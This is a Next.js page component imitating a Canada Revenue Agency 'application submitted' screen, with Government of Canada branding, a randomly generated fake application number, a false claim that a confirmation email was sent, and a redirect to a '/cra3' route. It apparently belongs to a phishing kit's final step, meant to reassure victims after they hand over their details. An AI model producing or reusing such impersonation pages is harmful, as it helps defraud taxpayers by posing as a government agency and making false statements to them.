"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";
import Image from "next/image";

export default function SubmittedPage() {
  const router = useRouter();
  const [secondsLeft, setSecondsLeft] = useState(5);
  const [applicationNumber, setApplicationNumber] = useState("");

  // Generate a random application number on component mount
  useEffect(() => {
    const generateAppNumber = () => {
      const prefix = "CRA";
      const year = new Date().getFullYear();
      const randomPart = Math.floor(100000 + Math.random() * 900000); // 6-digit number
      return `${prefix}-${year}-${randomPart}`;
    };
    setApplicationNumber(generateAppNumber());
  }, []);

  // Countdown and redirect (optional – you can remove this if you don't want auto-redirect)
  useEffect(() => {
    const interval = setInterval(() => {
      setSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    const timeout = setTimeout(() => {
      router.push("/cra3"); // Change to your desired destination
    }, 500000);

    return () => {
      clearInterval(interval);
      clearTimeout(timeout);
    };
  }, [router]);

  return (
    <>
      <Head>
        <title>Application Submitted - CRA</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div className="min-h-screen bg-white text-gray-800">
        {/* Government of Canada signature bar */}
        <div className="bg-gray-100 border-b border-gray-300">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-2 flex justify-between items-center">
            <Image
              src="/images/sig-blk-en.svg"
              alt="Government of Canada"
              width={500}
              height={150}
              className="h-16 w-auto"
            />
            <div className="text-right">
              <div className="text-xs sm:text-sm text-gray-600">Government of Canada</div>
              <div lang="fr" className="text-xs sm:text-sm text-gray-600">
                Gouvernement du Canada
              </div>
            </div>
          </div>
        </div>

        {/* CRA branding bar */}
        <div className="bg-[#26374a] text-white">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
            <div className="text-xl sm:text-2xl font-bold">Canada Revenue Agency</div>
          </div>
        </div>

        {/* Main content */}
        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
          <div className="max-w-2xl mx-auto text-center">
            {/* Success Message */}
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-4">
              Your application has been submitted
            </h1>
            
            {/* Application Number */}
            <div className="bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
              <p className="text-sm text-gray-600 mb-2">Your application number is:</p>
              <p className="text-2xl font-mono font-bold text-[#26374a]">
                {applicationNumber || "Generating..."}
              </p>
              <p className="text-xs text-gray-500 mt-2">
                Please keep this number for your records.
              </p>
            </div>

            <p className="text-gray-600 text-lg mb-2">Thank you for using the CRA secure portal.</p>
            <p className="text-sm text-gray-500">You will be redirected in {secondsLeft} seconds.</p>

            {/* Optional manual button instead of auto-redirect */}
            {/* <button
              onClick={() => router.push("/")}
              className="mt-6 bg-[#26374a] hover:bg-[#1c2a3f] text-white font-semibold py-3 px-8 rounded text-lg"
            >
              Return to Home
            </button> */}

            {/* Additional info */}
            <p className="text-xs text-gray-400 mt-8">
              A confirmation has been sent to your registered email address.
            </p>
          </div>
        </main>

        {/* Screen ID footer */}
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-4">
          <div className="text-xs text-gray-400 border-t pt-4">Screen ID: SBS.01</div>
        </div>
      </div>
    </>
  );
}